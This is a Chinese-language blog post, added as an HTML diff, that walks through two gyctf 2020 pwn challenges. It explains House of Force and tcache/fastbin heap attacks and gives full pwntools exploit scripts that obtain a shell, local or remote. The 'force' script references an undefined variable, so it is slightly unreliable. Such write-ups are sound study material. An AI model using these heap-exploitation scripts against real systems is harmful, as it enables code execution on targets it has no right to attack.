@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>gyctf_2020刷题 - Limu&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="gyctf_2020_force分析题目这个题目仅有add函数可用，并且会返回chunk的地址，而puts函数是没有作用的，所以这里考虑使用top chunk来泄露libc的基地址  利用方式1、当程序申请一个足够大的chunk的时候，会调用mmap在紧挨libc上方位置申请一个chunk块，所以只需要进行一个简单的计算，就可以得到libc的基地址。   1add(0x200000,b&amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gyctf_2020刷题">
+<meta property="og:url" content="https://limu.ltd/2023/03/27/gyctf-2020/index.html">
+<meta property="og:site_name" content="Limu&#39;s Blog">
+<meta property="og:description" content="gyctf_2020_force分析题目这个题目仅有add函数可用，并且会返回chunk的地址，而puts函数是没有作用的，所以这里考虑使用top chunk来泄露libc的基地址  利用方式1、当程序申请一个足够大的chunk的时候，会调用mmap在紧挨libc上方位置申请一个chunk块，所以只需要进行一个简单的计算，就可以得到libc的基地址。   1add(0x200000,b&amp;#x27;">
+<meta property="og:locale">
+<meta property="og:image" content="https://limu.ltd/images/gyctf-2020/1.png">
+<meta property="og:image" content="https://limu.ltd/images/gyctf-2020/2.png">
+<meta property="og:image" content="https://limu.ltd/images/gyctf-2020/3.png">
+<meta property="article:published_time" content="2023-03-27T02:32:51.000Z">
+<meta property="article:modified_time" content="2023-04-02T13:22:57.000Z">
+<meta property="article:author" content="Limu">
+<meta property="article:tag" content="CTF刷题记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://limu.ltd/images/gyctf-2020/1.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1685348109763">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1685348109763">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1685348109763">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(/images/1.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="Limu" class="mdui-btn mdui-btn-icon"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Limu"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Limu">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Limu" alt="Limu">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>10</div>
+        <div><span>Tags</span>3</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/50648378"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/limu520/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 20px;">CTF刷题记录</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/%E6%9D%82%E8%AE%B0/" style="font-size: 10px;">杂记</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(3);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">10</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/29/SWPUCTF-2019/">SWPUCTF_2019</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/19/qemu-iot/">Qemu-mips环境配置</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/zctf-2016-note3/">zctf_2016_note3</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/09/hitcon-2018-children-tcache/">hitcon_2018_children_tcache</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/07/lctf-2016/">lctf_2016</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 Limu
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <a href=”http://www.beian.miit.gov.cn”>鲁ICP备2022012729号</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="/images/gyctf-2020/0.jpg" alt="gyctf_2020刷题" loading="lazy">
+            <h1>gyctf_2020刷题</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年03月27日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h1><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>这个题目仅有add函数可用，并且会返回chunk的地址，而puts函数是没有作用的，所以这里考虑使用top chunk来泄露libc的基地址</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/gyctf-2020/1.png" alt="add函数" data-caption="add函数" loading="lazy"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>1、当程序申请一个足够大的chunk的时候，会调用mmap在紧挨libc上方位置申请一个chunk块，所以只需要进行一个简单的计算，就可以得到libc的基地址。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x200000,b&#x27;aaaa&#x27;) + 0x200ff0</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/gyctf-2020/2.png" alt="vmmap" data-caption="vmmap" loading="lazy"> </p>
+<p>2、当申请一个chunk的时候，在已有的内存找不到合适，或者组合的内存时，会从top chunk中切割一部分，我们通过溢出修改top chunk的大小，来实现chunk覆盖，从而修改指针。</p>
+<p>3、因为程序开启了got表的防护，所以，这里需要劫持malloc_hook为one_gadget，因为one_gadget需要一些特殊的条件，所以我们这里首先让栈帧平衡，在这里，我们使用了调用realloc前，对栈帧的一些平衡的操作，然后在使用one_gadget，所以，这样的话，我们只需要将malloc_hook的地址修改为realloc前的一部分地址，然后修改realloc_hook的地址为one_gadget,这样的话，就能成功getshell。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"># Author by: limu</span><br><span class="line"># Terminal: i3</span><br><span class="line"># Tools: pwntools</span><br><span class="line"># Usage: python3 exp.py [local or remote] [yes or no] ip port</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">elf = ELF(&#x27;./pwn1&#x27;)</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &#x27;l&#x27;:</span><br><span class="line">    p = process(&quot;./pwn1&quot;)</span><br><span class="line"></span><br><span class="line">elif sys.argv[1] == &#x27;r&#x27;:</span><br><span class="line">    p = remote(sys.argv[3], sys.argv[4])</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    print(&quot;wrong&quot;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"># 启动调试</span><br><span class="line">if sys.argv[2] == &#x27;y&#x27;:</span><br><span class="line">    gdb.attach(p, gdbscript=&#x27;break main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"># def exec_fmt(payload):</span><br><span class="line">#     p.sendline(payload)</span><br><span class="line">#     info = p.recv()</span><br><span class="line">#     return info</span><br><span class="line"># auto = FmtStr(exec_fmt)</span><br><span class="line"># offset = auto.offset</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    p.sendlineafter(b&#x27;\n&#x27;, b&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;\n&#x27;, str(size).encode())</span><br><span class="line">    p.recvuntil(b&#x27;0x&#x27;)</span><br><span class="line">    addr = int(b&#x27;0x&#x27; + p.recvuntil(b&#x27;\n&#x27;),16)</span><br><span class="line">    p.sendlineafter(b&#x27;\n&#x27;, content)</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line"># def edit(index1,index2,content):</span><br><span class="line">#     p.sendlineafter(b&#x27;&gt;&gt;\n&#x27;, b&#x27;3&#x27;)</span><br><span class="line">#     p.sendlineafter(b&#x27;\n&#x27;, str(index1).encode())</span><br><span class="line">#     p.sendlineafter(b&#x27;\n&#x27;, str(index2).encode())</span><br><span class="line">#     p.sendlineafter(b&#x27;TheNewContents:&#x27;, content)</span><br><span class="line"></span><br><span class="line"># def free(index):</span><br><span class="line">#     p.sendlineafter(b&#x27;&gt;&gt;\n&#x27;, b&#x27;4&#x27;)</span><br><span class="line">#     p.sendlineafter(b&#x27;\n&#x27;, str(index).encode())</span><br><span class="line"></span><br><span class="line"># def show(index):</span><br><span class="line">#     p.sendlineafter(b&#x27;&gt;&gt;\n&#x27;,b&#x27;2&#x27;)</span><br><span class="line">#     p.sendlineafter(b&#x27;\n&#x27;, str(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#libc = ELF(&#x27;/home/limu/Downloads/libc-2.23.so&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">base = add(0x200000,b&#x27;aaaa&#x27;) + 0x200ff0</span><br><span class="line">addr = add(0x18,p64(0) * 3 + p64(0xFFFFFFFFFFFFFFFF))</span><br><span class="line">top_addr = top_last_addr + 0x10</span><br><span class="line"></span><br><span class="line">offset = base + libc.symbols[&quot;__malloc_hook&quot;] - top_addr - 0x30</span><br><span class="line"></span><br><span class="line">one_gadget = base + 0x4525a</span><br><span class="line">realloc_addr = base + libc.symbols[&quot;__libc_realloc&quot;]</span><br><span class="line"></span><br><span class="line">add(offset,b&#x27; &#x27;) </span><br><span class="line">add(0x10,b&#x27;a&#x27; * 8 + p64(one_gadget) + p64(realloc_addr + 0x10))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;\n&#x27;, b&#x27;1&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;\n&#x27;, b&#x27;16&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h1><h2 id="分析题目-1"><a href="#分析题目-1" class="headerlink" title="分析题目"></a>分析题目</h2><p>这个题目存在后门backdoor，所以我们只需要满足条件，使ptr不等于0。  </p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/gyctf-2020/3.png" alt="backdoor函数" data-caption="backdoor函数" loading="lazy"></p>
+<p>然后我们看一下使用的libc是18.04版本的，相对于16.04,其中更新了tcache机制，即我们可以利用：  </p>
+<blockquote>
+<p>1、tcache仅有7个指针储存，当我们申请7个chunk并且free后，就可以填满tcache。  </p>
+<p>2、分配fastbin中的chunk时，如果还有其他相同大小的fastbin_chunk，则把它们全部放入tcache中。  </p>
+<p>3、calloc不会分配tcache中的chunk。  </p>
+</blockquote>
+<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><p>所以这个题目的利用方式也就出来了，利用calloc不会分配tcache的这个机制，伪造一个fastbin_chunk的fd，利用fastbin attche的方式，修改目标位置的内存。</p>
+<blockquote>
+<p>1、首先申请8个chunk，然后依次释放，这时，会有一个chunk因为tcache塞满，进入了fastbin中，也就是chunk7。  </p>
+<p>2、然后我们申请chunk8，此时，这个chunk会从tcache中取出，tcache会有一个空缺的位置（申请的chunk8和chunk6的地址会是相同的）。  </p>
+<p>3、然后我们修改chunk7的fd，然后利用calloc申请一个堆的操作，认为fd指向的位置为另外一个fastbin_chunk，所以会修改fd指向fake_chunk的fd，将fd指向的chunk放入tcache中。</p>
+</blockquote>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"># Author by: limu</span><br><span class="line"># Terminal: i3</span><br><span class="line"># Tools: pwntools</span><br><span class="line"># Usage: python3 exp.py [local or remote] [yes or no] ip port</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;i3-sensible-terminal&#x27;, &quot;-e&quot;]</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &#x27;l&#x27;:</span><br><span class="line">    p = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">elif sys.argv[1] == &#x27;r&#x27;:</span><br><span class="line">    p = remote(sys.argv[3], sys.argv[4])</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    print(&quot;wrong&quot;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"># 启动调试</span><br><span class="line">if sys.argv[2] == &#x27;y&#x27;:</span><br><span class="line">    gdb.attach(p, gdbscript=&#x27;break main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"># def exec_fmt(payload):</span><br><span class="line">#     p.sendline(payload)</span><br><span class="line">#     info = p.recv()</span><br><span class="line">#     return info</span><br><span class="line"># auto = FmtStr(exec_fmt)</span><br><span class="line"># offset = auto.offset</span><br><span class="line"></span><br><span class="line">def add(index):</span><br><span class="line">    p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;idx?\n&#x27;, str(index).encode())</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;idx?\n&#x27;, str(index).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;idx?\n&#x27;, str(index).encode())</span><br><span class="line"></span><br><span class="line"># def show(index):</span><br><span class="line">#     p.sendlineafter(b&#x27;&gt;&gt;\n&#x27;,b&#x27;2&#x27;)</span><br><span class="line">#     p.sendlineafter(b&#x27;\n&#x27;, str(index).encode())</span><br><span class="line"></span><br><span class="line">#libc = ELF(&#x27;/home/limu/Downloads/libc-2.27.so&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"> </span><br><span class="line">add(0)</span><br><span class="line">add(1)</span><br><span class="line">add(2)</span><br><span class="line">add(3)</span><br><span class="line">add(4)</span><br><span class="line">add(5)</span><br><span class="line">add(6)</span><br><span class="line">add(7)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">free(4)</span><br><span class="line">free(5)</span><br><span class="line">free(6)</span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line">add(8)</span><br><span class="line">payload = p64(0x4040c0-0x10)</span><br><span class="line">edit(7, payload)</span><br><span class="line">p.sendlineafter(b&#x27;your choice?&#x27;, b&#x27;6&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>Limu<br>
+        <strong>Link：</strong><a href="https://limu.ltd/2023/03/27/gyctf-2020/" title="https:&#x2F;&#x2F;limu.ltd&#x2F;2023&#x2F;03&#x2F;27&#x2F;gyctf-2020&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;limu.ltd&#x2F;2023&#x2F;03&#x2F;27&#x2F;gyctf-2020&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">CTF刷题记录</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#gyctf-2020-force"><span class="toc-number">1.</span> <span class="toc-text">gyctf_2020_force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">分析题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gyctf-2020-signin"><span class="toc-number">2.</span> <span class="toc-text">gyctf_2020_signin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.1.</span> <span class="toc-text">分析题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">2.2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1685348109766"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
